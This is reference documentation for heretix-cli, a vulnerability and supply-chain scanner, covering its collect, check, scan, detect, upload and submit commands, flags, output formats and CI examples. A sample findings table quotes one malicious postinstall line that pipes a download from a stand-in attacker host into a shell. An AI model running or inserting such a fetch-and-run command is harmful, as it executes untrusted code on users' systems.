# Commands

| Command | Purpose | Needs heretix-api |
|---|---|---|
| [`collect`](#package-collection-collect) | Scan a host, directory or image and write its packages as a CycloneDX SBOM | No |
| [`check`](#vulnerability-check-check) | Check an SBOM against heretix-api | Yes |
| [`scan`](#one-shot-scan-scan) | `collect` + `check` + local checks in one command | Yes |
| [`detect`](#local-only-detection-detect) | Local security checks only | No |
| [`upload`](#upload-to-heretix-management-upload) | Send an SBOM to heretix-management, which tracks its findings | No |
| [`submit`](#github-dependency-submission-submit) | Send an SBOM to GitHub's Dependency Submission API (Dependabot) | No |

## Package Collection (`collect`)

Scans the system and outputs installed packages as a CycloneDX SBOM. Can run offline.

```bash
heretix-cli collect
heretix-cli collect --output packages.json --scan-path /srv
heretix-cli collect --skip npm,pypi --verbose

# Scan a Docker image
heretix-cli collect --image nginx:latest --output nginx-sbom.json
heretix-cli collect --image registry.example.com/myapp:v1.2 --output myapp-sbom.json

# Include the FROM base image from a Dockerfile
heretix-cli collect --image myapp:latest --dockerfile ./Dockerfile --output full-sbom.json
```

> **Removed:** the heretix inventory JSON (`--format json`, `inventory.json`) is gone. `collect` writes only a CycloneDX SBOM, and `check`, `submit` and `upload` read only that; given an old `inventory.json`, they stop and ask you to re-run `collect`. `--format json` now fails with exit code 2. (`check`, `scan` and `detect` still have their own `--format json`, which selects the report format and is unaffected.)

| Flag | Default | Description |
|---|---|---|
| `--output` | see description | Output file path. Defaults to `{--name}.json`, else `{--scan-path basename}.json`, else `sbom.json` when the scan path is a filesystem root |
| `--name` | (none) | Override the hostname recorded in the output (e.g. to tell apart several projects on one host). Also names the default output file |
| `--format` | `cyclonedx` | Output format. `cyclonedx` is the only one; `json` (the heretix inventory) has been removed |
| `--scan-path` | `/` (Linux) / `%SystemDrive%\` (Windows) | Root path for filesystem traversal |
| `--skip` | (none) | Sources to skip (e.g. `--skip npm`) |
| `--verbose` | `false` | Enable verbose logging |
| `--image` | (none) | Docker image reference to scan (e.g. `nginx:latest`) |
| `--dockerfile` | (none) | Dockerfile path: also chain-scans the FROM base image |

What the SBOM contains, and which fields each lockfile can fill: [sbom.md](sbom.md).

## Vulnerability Check (`check`)

Reads a CycloneDX SBOM produced by `collect` and queries heretix-api for vulnerabilities in its packages.

```bash
heretix-cli check sbom.json
heretix-cli check sbom.json --api-url http://heretix-api:5000 --api-key your-secret-key --severity 7.0
heretix-cli check sbom.json --format json > results.json
```

| Flag | Default | Description |
|---|---|---|
| `--api-url` | `http://localhost:5000` | heretix-api URL |
| `--api-key` | (none) | **Required.** heretix-api key; `HERETIX_API_KEY` is used when the flag is omitted. With neither set, `check`/`scan` stop with exit code 2 before doing any work, since heretix-api rejects every request without a key |
| `--format` | `table` | Output format: `table` / `json` |
| `--severity` | `0.0` | Minimum CVSS score threshold. A vulnerability with a severity rating but no CVSS score is kept if its rating could reach the threshold (CRITICAL up to 10.0, HIGH up to 8.9, MEDIUM up to 6.9, LOW up to 3.9) |
| `--concurrency` | `2` | Batch searches sent at once (1,000 packages each). heretix-api runs 2 at once by default and refuses the rest with 429, so a higher value only makes the extra ones wait; raise it together with `BATCH_SEARCH_MAX_CONCURRENT` on heretix-api |
| `--timeout` | `30s` | Per-request timeout |
| `--runtime-only` | `false` | Report only runtime packages (hide kernel header and build toolchain findings) |
| `--verbose` | `false` | Enable verbose logging |

### When heretix-api refuses a search

heretix-api limits how many batch searches run at once, and how many one client address may send per minute; past a limit it answers `429` with a `Retry-After`. `check` and `scan` wait that long (5 seconds if none is given, never less than 1 or more than 60) and send the batch again, up to 5 attempts in all. The wait is logged, so a slow scan is not mistaken for a hung one. Other failures (a wrong key, a server error) are not retried.

If a batch is still refused after that, its packages go unchecked, and the findings in them are missing. `check` and `scan` say so before the report (`N of M packages could not be checked`), list the errors after it, and **exit with code 2** even when the rest turned up findings, so an incomplete result is never taken for a clean or a complete one. With `--format json`, `summary.uncheckedPackages` is the number of packages not checked (`0` for a complete check).

## One-shot Scan (`scan`)

Runs `collect` and `check` in a single command. No intermediate file needed.

```bash
# Live system scan
heretix-cli scan
heretix-cli scan --scan-path /srv --api-url http://heretix-api:5000 --api-key your-secret-key --severity 7.0

# Docker image scan
heretix-cli scan --image nginx:latest --api-url http://heretix-api:5000 --api-key your-secret-key
heretix-cli scan --image 123456789.dkr.ecr.ap-northeast-1.amazonaws.com/myapp:v1.2 --severity 7.0

# Include the FROM base image from a Dockerfile
heretix-cli scan --image myapp:latest --dockerfile ./Dockerfile --api-url http://heretix-api:5000

# Pass API key via environment variable
HERETIX_API_KEY=your-secret-key heretix-cli scan --api-url http://heretix-api:5000
```

When `--image` is specified, the Docker daemon is checked first; if the image is not found locally it is pulled directly from the registry. Registry credentials are read from `~/.docker/config.json`, including its `credHelpers`/`credsStore` entries — so ECR or GCR work once their Docker credential helper (`docker-credential-ecr-login`, `docker-credential-gcr`) is installed and configured there, the same as for `docker pull`.

When `--image` is specified, the host reported (and, with `collect`, the `hostname` field in the SBOM) is the **image reference** (e.g. `nginx:latest`) instead of the machine hostname. This allows each image to be managed as an independent asset when imported into heretix-management.

This command takes `collect`'s `--scan-path`, `--skip` and `--verbose` and all of `check`'s flags (`--api-url`, `--api-key`, `--format`, `--severity`, `--concurrency`, `--timeout`). It writes no SBOM file, so `collect`'s `--output` and `--name` don't apply, and `--format` is `check`'s `table`/`json`, not `cyclonedx`.

| Flag | Default | Description |
|---|---|---|
| `--image` | (none) | Docker image reference to scan |
| `--dockerfile` | (none) | Dockerfile path: also chain-scans the FROM base image |
| `--skip-local` | `false` | Skip local security checks (GlassWorm, Dependency Confusion, Malicious Install, CI/CD Poisoning, Lock File Integrity) |
| `--check-registry` | `false` | Query npmjs.org to classify unknown npm scopes (requires network) |
| `--runtime-only` | `false` | Report only runtime packages (see [Non-runtime packages](package-detection.md#non-runtime-packages)) |

## Upload to heretix-management (`upload`)

Uploads a CycloneDX SBOM written by `collect` to [heretix-management](https://github.com/TITeee/heretix-management), which imports it into the asset its hostname names, creating the asset if it is new. Re-uploading updates the asset incrementally. heretix-management scans it on its own schedule (daily by default), or from the asset's page with **Run Scan**; `upload` itself doesn't wait for or report findings. To fail a CI job on findings, use `scan` instead (see [CI/CD Examples](#cicd-examples)).

```bash
export HERETIX_MANAGEMENT_URL=https://heretix.example.com
export HERETIX_MANAGEMENT_TOKEN=hx_xxx

heretix-cli collect --image myapp:1.0 --name myapp --output sbom.json
heretix-cli upload sbom.json
```

It needs an access token with the `import` scope, created by an admin in heretix-management under **Settings → Access Tokens**. The token only allows importing; it cannot sign in or read findings.

| Flag | Default | Description |
|---|---|---|
| `--url` | `$HERETIX_MANAGEMENT_URL` | heretix-management's URL (the console's own address, including any path prefix behind a reverse proxy). **Required** |
| `--token` | `$HERETIX_MANAGEMENT_TOKEN` | Access token with the `import` scope. **Required** |
| `--hostname` | (none) | The asset to import into, overriding the SBOM's own hostname. `collect --name` sets that hostname in the first place, so this is mainly for re-targeting an existing SBOM |
| `--display-name` | (none) | The asset's display name. Without it, a new asset is named after its hostname and an existing asset keeps the name it has, so pass it only to set or change the name. (heretix-management before 2026-10-06 reset the name to the hostname on every upload without one; with such a version, pass it on every upload.) |
| `--dry-run` | `false` | Import nothing; show whether the upload would create a new asset or update an existing one, and how many packages it would add, remove and upgrade. Use it to check `--name`/`--hostname` before wiring up a CI job |
| `--timeout` | `5m` | Request timeout |

The URL, the token and the file (it must be a CycloneDX SBOM) are checked before anything is sent; a missing or invalid one stops `upload` with exit code 2. So does a failed upload, with a hint for the usual causes: an invalid, expired or revoked token (401), a token without the `import` scope (403), a URL that isn't heretix-management's (a redirect to its login page, or 404 from heretix-api), and too many failed token attempts (429). Over plain `http://` to anything but localhost, `upload` warns that the token travels unencrypted.

A dry run prints, for example:

```
Would update asset "My App" (hostname: myapp, last scanned 2026-10-06T01:00:00Z).
  Packages: 12 added, 3 removed (2 of them upgraded to a new version)
Nothing was imported (dry run).
```

Assets are matched by hostname alone, so a wrong `--name` or `--hostname` would quietly update a different asset; an unexpectedly large removal count usually means the scan covered the wrong path or image.

## GitHub Dependency Submission (`submit`)

Reads a CycloneDX SBOM produced by `collect` and submits it to the [GitHub Dependency Submission API](https://docs.github.com/en/rest/dependency-graph/dependency-submission) so that Dependabot can generate vulnerability alerts for the detected packages.

```bash
# Typical CI/CD usage — env vars are set automatically by GitHub Actions
heretix-cli collect --output sbom.json
heretix-cli submit sbom.json

# Manual usage
heretix-cli submit sbom.json \
  --token ghp_xxx \
  --repo owner/repo \
  --sha $(git rev-parse HEAD) \
  --ref refs/heads/main
```

| Flag | Default | Description |
|---|---|---|
| `--token` | `$GITHUB_TOKEN` | GitHub token with `contents: write` permission |
| `--repo` | `$GITHUB_REPOSITORY` | Repository in `owner/repo` format |
| `--sha` | `$GITHUB_SHA` | Commit SHA to associate the snapshot with |
| `--ref` | `$GITHUB_REF` | Git ref (e.g. `refs/heads/main`) |
| `--correlator` | `heretix-cli` | Unique string identifying this detector — same value overwrites the previous snapshot |
| `--job-id` | `$GITHUB_RUN_ID` | Unique ID for this run |

Packages detected from lock files are grouped into manifests by source file. A package a collector marked as a direct dependency (the `direct` column in the [coverage table](sbom.md#coverage-by-lockfile) — e.g. `// indirect` in `go.mod`, the root entry's dependencies in `package-lock.json`, `importers:` in `pnpm-lock.yaml`, the project's own entry in `uv.lock`) is submitted with `relationship: "direct"`; all others, including those whose directness is unknown, use `"indirect"`.

## Local-only Detection (`detect`)

Runs all active local security checks without calling the vulnerability API. Works fully offline.

```bash
heretix-cli detect
heretix-cli detect --scan-path /srv/myapp
heretix-cli detect --format json

# Scan a Docker image
heretix-cli detect --image nginx:latest
heretix-cli detect --image myapp:latest --dockerfile ./Dockerfile
```

| Flag | Default | Description |
|---|---|---|
| `--scan-path` | `/` (Linux) / `%SystemDrive%\` (Windows) | Root path for filesystem traversal |
| `--image` | (none) | Docker image reference to scan |
| `--dockerfile` | (none) | Dockerfile path: also chain-scans the FROM base image |
| `--format` | `table` | Output format: `table` / `json` |
| `--verbose` | `false` | Enable verbose logging |
| `--check-registry` | `false` | Query npmjs.org to classify unknown npm scopes (requires network) |

## Output

### Table Output (default)

```
Vulnerability Check Report
==========================
Source:     sbom.json
Host:       server01
Packages:   1523 checked (rpm: 1200, dpkg: 320, pip: 280, npm: 43)

   ECOSYSTEM   PACKAGE               VERSION    SOURCE               DB    VULN ID               CVSS   EPSS  SUMMARY
   ──────────  ────────────────────  ─────────  ──────────────────── ───   ───────────────────   ────   ────  ──────────────
!  AlmaLinux   curl                  7.88.1     rpm                  nvd   CVE-2024-1234          9.8  0.950  Remote code exec
   AlmaLinux   openssl               3.0.11     rpm                  osv   ALSA-2024:5678         7.5  0.123  Buffer overflow
   Debian      libssl3               3.0.11     dpkg                 nvd   CVE-2024-5678          7.5  0.098  Buffer overflow
   PyPI        requests              2.31.0     /srv/myapp/requir... osv   GHSA-xxxx-yyyy         6.1  0.045  SSRF via proxy
 K Debian      linux-libc-dev        6.12.43-1  dpkg                 osv   CVE-2024-4321          7.8  0.010  Kernel use-after-free
 B Debian      binutils(2 pkgs)      2.44-3     dpkg                 osv   CVE-2024-9999          5.5  0.002  Heap overflow in BFD
~  PyPI        somepkg               v2024.1    pip                  osv   GHSA-zzzz-zzzz         6.0      -  Some vulnerability
#D npm         malicious-pkg         1.0.0      pnpm-lock.yaml       osv   MAL-2024-1234            -      -  Malicious package

# = malicious package (OSSF Malicious Packages)
! = in CISA Known Exploited Vulnerabilities (KEV) catalog
~ = approximate match (version could not be normalized, showing all vulnerabilities for this package)
K = kernel headers (the host kernel runs, not this package's code)
B = build toolchain (compiler, linker or development headers left from a build stage)
D = dev/test-only dependency (not in a production build, but runs on developer machines and CI)
(N pkgs) = the same vulnerability in N binary packages built from this source package (PACKAGE names the source package)
multiple = the binary packages in this row do not share one version
DB = data source (osv = Open Source Vulnerabilities, nvd = NIST NVD, advisory = Vendor Advisory)
EPSS = Exploit Prediction Scoring System probability (0.000–1.000)

Summary: 14 packages with 21 findings (1 malware, 1 KEV)
  Malware:          1
  Critical:         1
  High:             4
  Medium:           8
  Low:              5
  Non-runtime:      2 (kernel 1, build 1)
  (counted above; re-run with --runtime-only to exclude them)
  Dev/test-only:    1 (counted above)

Local Security Findings
=======================
  TYPE            FILE                                LINE  SEVERITY  DETAIL
  ─────────────── ─────────────────────────────────── ────  ────────  ────────────────────────────────────
G glassworm          /app/utils.py                         42  CRITICAL  invisible char U+202E (RIGHT-TO-LEFT OVERRIDE) detected
D dep-confusion      /app/.npmrc                            -  HIGH      scoped package @myco has no registry mapping in .npmrc
D dep-confusion      /app/requirements.txt                 15  HIGH      --extra-index-url found: pip selects highest version across all indexes
M malicious-install  /app/package.json                      -  CRITICAL  postinstall: remote code download piped to shell — curl https://evil.example/install.sh | sh
C cicd-poisoning     /app/.github/workflows/ci.yml         12  HIGH      [github-actions] action pinned to mutable branch ref — uses: actions/checkout@main
L lockfile-integrity /app/package-lock.json                 -  HIGH      lodash: integrity uses SHA-1 (broken) — regenerate lockfile with npm ≥ 5 to get SHA-512

G = GlassWorm (invisible/zero-width character injection)
D = Dependency Confusion (private package resolvable from public registry)
M = Malicious Install (dangerous command in lifecycle hook)
C = CI/CD Poisoning (pipeline configuration attack pattern)
L = Lock File Integrity (weak hash or manifest/lockfile drift)

Local findings: 6 (1 glassworm, 2 dep-confusion, 1 malicious-install, 1 cicd-poisoning, 1 lockfile-integrity)
```

### JSON Output (`--format json`)

Only JSON is written to stdout (includes both vulnerability results and local findings under `localFindings`). Progress logs go to stderr, so pipe processing works cleanly.

Each entry under `results[]` carries `sourcePackage`, `category` (see [Non-runtime packages](package-detection.md#non-runtime-packages)) and `scope` (`excluded` for a dev/test-only dependency, or a non-runtime OS package) so a script can group by source package itself; results keep full per-binary-package granularity rather than the table's collapsed rows. `--runtime-only` drops results on non-runtime packages here too, matching the table and the exit code. `summary.aggregatedFindings` gives the collapsed count (one per source package + vulnerability) without requiring that regrouping, and `summary.uncheckedPackages` the number of packages whose search failed (see [When heretix-api refuses a search](#when-heretix-api-refuses-a-search)).

Each vulnerability carries heretix-api's fix and distro fields as returned (empty string when the API has none):

| Field | Meaning |
|---|---|
| `fixedVersion` | The version that resolves this finding, when the source states one |
| `distroPriority` | The distro's own rating of this CVE for the matched package, verbatim — Ubuntu priority (`negligible`…`critical`), Debian urgency (`unimportant`…`high`), or Red Hat impact (`low`…`critical`). Can differ from the CVE-wide `severity` |
| `fixStatus` | Whether a fix will come for an unfixed package: `affected`, `deferred`, `will_not_fix`, `out_of_support`, `under_investigation`. From Red Hat VEX and the Debian security tracker only. Treat an unknown value like `affected` — heretix-api may add more |
| `fixStatusDetail` | The source's own wording for `fixStatus` (e.g. `Will not fix`, or the Debian tracker's tag and note) |

## Exit Codes

| Code | Meaning |
|---|---|
| `0` | No vulnerabilities, malware, or local findings (or a successful `collect`, `submit` or `upload`) |
| `1` | Vulnerabilities, malware, or local security findings found (for CI/CD integration) |
| `2` | Execution failure, including a check that could not search every package (see [When heretix-api refuses a search](#when-heretix-api-refuses-a-search)): the findings shown are then incomplete |

## CI/CD Examples

### Live System Scan

```bash
export HERETIX_API_KEY=your-secret-key
heretix-cli scan --api-url http://heretix-api:5000 --severity 7.0 --format json > /dev/null
if [ $? -eq 1 ]; then
  echo "High severity vulnerabilities found!"
  exit 1
fi
```

### Docker Image Scan (post-build check)

```bash
docker build -t myapp:latest .
heretix-cli scan --image myapp:latest --api-url http://heretix-api:5000 --api-key your-secret-key --severity 7.0
```

### Full Scan Including Dockerfile Base Image

```bash
heretix-cli scan --image myapp:latest --dockerfile ./Dockerfile \
  --api-url http://heretix-api:5000 --api-key your-secret-key --severity 7.0 --format json > vuln-report.json
```

### Track an Image in heretix-management

`scan` gives a pass/fail result in the pipeline itself. To keep the findings in heretix-management instead, where they are tracked across builds, collect and upload:

```bash
docker build -t myapp:latest .
heretix-cli collect --image myapp:latest --name myapp --output sbom.json
heretix-cli upload sbom.json   # HERETIX_MANAGEMENT_URL and HERETIX_MANAGEMENT_TOKEN set as CI secrets
```

A fixed `--name` keeps every build updating the same asset rather than creating one per tag.

### Dependabot Integration (GitHub Actions)

```yaml
- name: Collect packages
  run: heretix-cli collect --output sbom.json

- name: Submit to GitHub Dependency Graph
  run: heretix-cli submit sbom.json
  env:
    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    # GITHUB_REPOSITORY, GITHUB_SHA, GITHUB_REF, GITHUB_RUN_ID are set automatically
```

Once submitted, Dependabot analyses the snapshot and generates vulnerability alerts for any package with a known CVE.
